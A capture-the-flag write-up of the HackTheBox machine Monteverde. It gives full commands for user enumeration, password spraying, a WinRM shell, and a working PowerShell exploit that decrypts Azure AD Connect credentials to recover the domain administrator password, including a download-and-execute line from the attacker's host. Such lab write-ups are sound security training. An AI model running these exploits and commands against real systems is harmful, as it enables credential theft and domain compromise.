---
title: HTB: Monteverde
url: https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html
date: 2020-06-13T14:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: htb-monteverde, hackthebox, ctf, nmap, windows, active-directory, smb, smbclient, smbmap, rpc, rpcclient, crackmapexec, password-spray, credentials, azure-active-directory, evil-winrm, azure-connect, powershell, sqlcmd, mssql, oscp-plus-v2, osep-plus, osep-like, oscp-like-v3
---

![Monteverde](https://0xdfimages.gitlab.io/img/monteverde-cover.jpg)

For the third week in a row, a Windows box on the easier side of the spectrum with no web server retires. Monteverde was focused on Azure Active Directory. First I’ll look at RPC to get a list of users, and then check to see if any used their username as their password. With creds for SABatchJobs, I’ll gain access to SMB to find an XML config file with a password for one of the users on the box who happens to have WinRM permissions. From there, I can abuse the Azure active directory database to leak the administrator password. In Beyond Root, I’ll look deeper into two versions of the PowerShell script I used to leak the creds, and how they work or don’t work.

## Box Info

| Name | [Monteverde](https://hackthebox.com/machines/monteverde)  [Monteverde](https://hackthebox.com/machines/monteverde) [Play on HackTheBox](https://hackthebox.com/machines/monteverde) |
| --- | --- |
| Release Date | [11 Jan 2020](https://twitter.com/hackthebox_eu/status/1215300155341266951) |
| Retire Date | 13 Jun 2020 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Monteverde |
| Radar Graph | Radar chart for Monteverde |
| First Blood User | 00:18:06[kolokokop kolokokop](https://app.hackthebox.com/users/91278) |
| First Blood Root | 01:45:14[splintercode splintercode](https://app.hackthebox.com/users/19456) |
| Creator | [egre55 egre55](https://app.hackthebox.com/users/1190) |

## Recon

### nmap

`nmap` showed 19 open TCP ports:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.172
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-18 17:06 EST
Nmap scan report for 10.10.10.172
Host is up (0.019s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49702/tcp open  unknown
49771/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
root@kali# nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.172
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-18 17:08 EST
Stats: 0:04:03 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.12% done; ETC: 17:12 (0:00:02 remaining)
Nmap scan report for 10.10.10.172
Host is up (0.017s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-18 22:18:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/18%Time=5E2381D3%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 9m55s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-01-18T22:20:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 303.00 seconds

```

These are all typical Windows looking ports. Seeing TCP DNS (53) along with Kerberos (TCP 88) and LDAP (TCP 389) suggests this might be a domain controller.

### SMB Without Creds- TCP 445

Doesn’t look like I can connect to anything on SMB without creds:

```

root@kali# smbclient -N -L //10.10.10.172
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.10.172]
Error returning browse list: NT_STATUS_REVISION_MISMATCH
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

root@kali# smbmap -H 10.10.10.172 
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.172...
[+] IP: 10.10.10.172:445        Name: 10.10.10.172                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
[!] Access Denied

root@kali# smbmap -H 10.10.10.172 -u 0xdf
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.172
[!] Authentication error on 10.10.10.172

```

### RPC - TCP 445

I am able to get a RPC session without creds:

```

root@kali# rpcclient -U "" -N 10.10.10.172
rpcclient $>

```

I can get a list of users with descriptions:

```

rpcclient $> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)

```

I did some looking at each use and group, but didn’t identify anything that interesting.

## Shell as mhope

### Credential Brute Force

After poking around at other things and finding very little, I came back to the usernames I had. I created a file with one user per line, and one of the things I checked was if any used their username as their password by running the following `crackmapexec`. This can be a form a password spraying, because I really only want to check one password for each user. Because my list is small and this is HTB, I’ll just try each user with each username as the password. In a real environment, I’d only want to try each user with their username:

```

root@kali# crackmapexec smb 10.10.10.172 -u users -p users --continue-on-success
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
...[snip]...

```

I got a match! The rest were fails (snipped above), but one is all I need.

### SMB with Creds - TCP 445

`smbmap` tells me what shares there are and what I have access to (output cleaned up a bit):

```

root@kali# smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
[+] IP: 10.10.10.172:445        Name: 10.10.10.172                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        users$                                                  READ ONLY

```

I looked through each share. I can connect with `smbclient` and poke around, or use `smbmap` to list out files. Either way, I find something interesting in the `users$` share:

```

root@kali# smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.172...
[+] IP: 10.10.10.172:445        Name: 10.10.10.172                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        .                                                  
        dr--r--r--                0 Fri Jan  3 08:12:48 2020    .
        dr--r--r--                0 Fri Jan  3 08:12:48 2020    ..
        dr--r--r--                0 Fri Jan  3 08:15:23 2020    dgalanos
        dr--r--r--                0 Fri Jan  3 08:41:18 2020    mhope
        dr--r--r--                0 Fri Jan  3 08:14:56 2020    roleary
        dr--r--r--                0 Fri Jan  3 08:14:28 2020    smorgan
        users$                                                  READ ONLY
        .\
        dr--r--r--                0 Fri Jan  3 08:12:48 2020    .
        dr--r--r--                0 Fri Jan  3 08:12:48 2020    ..
        dr--r--r--                0 Fri Jan  3 08:15:23 2020    dgalanos
        dr--r--r--                0 Fri Jan  3 08:41:18 2020    mhope
        dr--r--r--                0 Fri Jan  3 08:14:56 2020    roleary
        dr--r--r--                0 Fri Jan  3 08:14:28 2020    smorgan
        .\mhope\
        dr--r--r--                0 Fri Jan  3 08:41:18 2020    .
        dr--r--r--                0 Fri Jan  3 08:41:18 2020    ..
        -w--w--w--             1212 Fri Jan  3 09:59:24 2020    azure.xml

```

There’s a file at `\\10.10.10.172\mhope\azure.xml`. I’ll grab it with `smbclient`:

```

root@kali# smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs -c 'get mhope/azure.xml azure.xml'
getting file \mhope\azure.xml of size 1212 as azure.xml (24.7 KiloBytes/sec) (average 24.7 KiloBytes/sec)

```

It contains a password:

```

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>

```

### Shell Over WinRM

Since that configuration file was in mhope’s directory, I’ll guess that the creds are associated with that user. `crackmapexec` shows that not only is that right, but that they will work over WinRM:

```

root@kali# crackmapexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
WINRM       10.10.10.172    5985   MONTEVERDE       [*] http://10.10.10.172:5985/wsman
WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK\mhope:4n0therD4y@n0th3r$ (Pwn3d!)

```

I’ll grab a shell with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```

root@kali# evil-winrm.rb -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'

Info: Starting Evil-WinRM shell v1.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents>

```

And I can grab `user.txt`:

```
*Evil-WinRM* PS C:\Users\mhope\desktop> type user.txt
4961976b************************

```

## Priv: mhope –> administrator

### Enumeration

I already had a hint that this box has something with Azure Active Directory going on when I saw the `azure_uploads` share. Looking at mhope’s groups, I see `Azure Admins`:

```
*Evil-WinRM* PS C:\> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 3:40:05 PM
Password expires             Never
Password changeable          1/3/2020 3:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               \\monteverde\users$\mhope
Last logon                   1/18/2020 11:05:46 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users         
The command completed successfully.

```

There’s a bunch of programs related to this as well:

```
*Evil-WinRM* PS C:\Program Files> ls *Azure*

    Directory: C:\Program Files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync         

```

### Exploit

#### Theory

[This post](https://blog.xpnsec.com/azuread-connect-for-redteam/) does a really nice walkthrough of how to abuse Azure connect. The idea is that there is a user that is setup to handle replication of Active Directory to Azure. In the default case, that’s an account named like MSOL\_[somehex]. I’ll see shortly that’s not the case here.

It turns out mhope is able to connect to the local database and pull the configuration. I can then decrypt it and get the username and password for the account that handles replication.

#### Timing

On reviewing the blog post to write this, I see there’s an update:

> **Update 12/04/2020** - Due to changes in the way which Azure AD Sync now stores its keys, access to the service account (ADSync by default) or the Credential Manager of the service account is now required to decrypt the configuration. One way to work around this using tools such as Cobalt Strike is to simply inject into a process running under the ADSync process and continue with the above POC. Alternatively we can take advantage of the fact that the LocalDB instance is in-fact running as the “ADSync” user, meaning that a simple bit of `xp_cmdshell` magic is all we need to resume our decryption method. A new POC to leverage this can be found [here](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c).

New Azure AD instances are hardened such that only certain accounts can decrypt the password. The new POC doesn’t work here, and I’ll look at why in [Beyond Root](#beyond-root).

#### Practice

I’ll grab the POC code from the blog. I had to change the connection string to get this to connect (something like [this example](https://myitworld.azurewebsites.net/2015/12/14/access-sql-server-integrated-security-different-windows-credentials-powershell/) worked). My script looked like this:

```

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)

```

Now I can just use `python3 -m http.server 80` on my localhost, and run it on Monteverde:

```
*Evil-WinRM* PS C:\Program Files> iex(new-object net.webclient).downloadstring('http://10.10.14.11/Get-MSOLCredentials.ps1')
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!

```

Interestingly, it gives the administrator account password. That must be the replication account here, instead of the MSOL\_ account I saw in the documentation.

### Shell Over WinRM

With this password, I can get a WinRM shell as administrator:

```

root@kali# evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'

Evil-WinRM shell v2.1

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And I can grab the flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
12909612************************

```

## Beyond Root

### Successful Exploit in Detail

#### Steps

The exploit breaks down into three parts:
- Get the information from the DB to retrieve the encryption keys from the KeyManager.
- Get the config and encrypted password from the DB.
- Fetch the keys and decrypt the password.

#### Fetch Key Information

This code is just doing a simple query to the database and storing the results in appropriate variables:

```

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

```

I can do that same query using `sqlcmd` on Monteverde to see the results:

```
*Evil-WinRM* PS C:\> sqlcmd -d ADSync -Q 'SELECT keyset_id, instance_id, entropy FROM mms_server_configuration'
keyset_id   instance_id                          entropy
----------- ------------------------------------ ------------------------------------
          1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD

(1 rows affected)

```

#### Fetch Config Information

The next section of code a second query to get the config information:

```

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

```

Again, I can do that same query with `sqlcmd`, but it doesn’t print the full results:

```
*Evil-WinRM* PS C:\> sqlcmd -d ADSync -Q 'SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = "AD"'
private_configuration_xml                                                                                                                                                                                                                                        encrypted_configuration
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g

(1 rows affected)

```

I found [this stackoverflow post](https://stackoverflow.com/questions/24345345/how-to-prevent-sqlcmd-truncation-with-for-xml-path-query-result) which showed `-y 0` worked to get the full result:

```
*Evil-WinRM* PS C:\> sqlcmd -y0 -d ADSync -Q 'SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = "AD"'
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL</forest-login-domain>
 <sign-and-seal>1</sign-and-seal>
 <ssl-bind crl-check="0">0</ssl-bind>
 <simple-bind>0</simple-bind>
 <default-ssl-strength>0</default-ssl-strength>
 <parameter-values>
  <parameter name="forest-login-domain" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="forest-login-user" type="string" use="connectivity" dataType="String">administrator</parameter>
  <parameter name="password" type="encrypted-string" use="connectivity" dataType="String" encrypted="1" />
  <parameter name="forest-name" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="sign-and-seal" type="string" use="connectivity" dataType="String">1</parameter>
  <parameter name="crl-check" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="ssl-bind" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="simple-bind" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="Connector.GroupFilteringGroupDn" type="string" use="global" dataType="String" />
  <parameter name="ADS_UF_ACCOUNTDISABLE" type="string" use="global" dataType="String" intrinsic="1">0x2</parameter>
  <parameter name="ADS_GROUP_TYPE_GLOBAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000002</parameter>
  <parameter name="ADS_GROUP_TYPE_DOMAIN_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
  <parameter name="ADS_GROUP_TYPE_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
  <parameter name="ADS_GROUP_TYPE_UNIVERSAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000008</parameter>
  <parameter name="ADS_GROUP_TYPE_SECURITY_ENABLED" type="string" use="global" dataType="String" intrinsic="1">0x80000000</parameter>
  <parameter name="Forest.FQDN" type="string" use="global" dataType="String" intrinsic="1">MEGABANK.LOCAL</parameter>
  <parameter name="Forest.LDAP" type="string" use="global" dataType="String" intrinsic="1">DC=MEGABANK,DC=LOCAL</parameter>
  <parameter name="Forest.Netbios" type="string" use="global" dataType="String" intrinsic="1">MEGABANK</parameter>
</parameter-values>
 <password-hash-sync-config>
            <enabled>1</enabled>
            <target>{B891884F-051E-4A83-95AF-2544101C9083}</target>
         </password-hash-sync-config>
</adma-configuration>
8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ=

(1 rows affected)

```

The encrypted password is there at the bottom, and the config is at the top.

#### Decrypt

The third section of the script decrypts. First it goes through a series of hoops to get the decryption object from the KeyManager:

```

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)

```

Now it decrypts:

```

$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

```

The rest is just formatting the output and printing:

```

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)

```

### New POC

#### Differences

Other than some additional print statements, the first two sections of the [new POC](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c) are exactly the same. The third part is new. Instead of fetching the keys and decrypting in PowerShell, it passes those commands through `xp_cmdshell` so that the database runs the commands:

```

$cmd = $client.CreateCommand()
$cmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell.exe -c `"add-type -path ''C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'';`$km = New-Object -TypeName Microsoft.DirectoryServices.                 MetadirectoryServices.Cryptography.KeyManager;`$km.LoadKeySet([guid]''$entropy'', [guid]''$instance_id'', $key_id);`$key = `$null;`$km.GetActiveCredentialKey([ref]`$key);`$key2 = `$null;`$km.GetKey(1, [ref]`$key2);`$decrypted = `$null;`$key2.DecryptBase64ToString(''$crypted'', [ref]`$decrypted);Write-Host        `$decrypted`"'"
$reader = $cmd.ExecuteReader()

$decrypted = [string]::Empty

while ($reader.Read() -eq $true -and $reader.IsDBNull(0) -eq $false) {
    $decrypted += $reader.GetString(0)
}

if ($decrypted -eq [string]::Empty) {
    Write-Host "[!] Error using xp_cmdshell to launch our decryption powershell"
    return
}

```

#### Running It

I downloaded a copy of the [new POC code](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c) and updated the connections string to match what I did in the original:

```

Write-Host "AD Connect Sync Credential Extract v2 (@_xpn_)"
Write-Host "`t[ Updated to support new cryptokey storage method ]`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"

try {
    $client.Open()
} catch {
    Write-Host "[!] Could not connect to localdb..."
    return
}

Write-Host "[*] Querying ADSync localdb (mms_server_configuration)"

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
if ($reader.Read() -ne $true) {
    Write-Host "[!] Error querying mms_server_configuration"
    return
}

$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

Write-Host "[*] Querying ADSync localdb (mms_management_agent)"

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
if ($reader.Read() -ne $true) {
    Write-Host "[!] Error querying mms_management_agent"
    return
}

$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

Write-Host "[*] Using xp_cmdshell to run some Powershell as the service user"

$cmd = $client.CreateCommand()
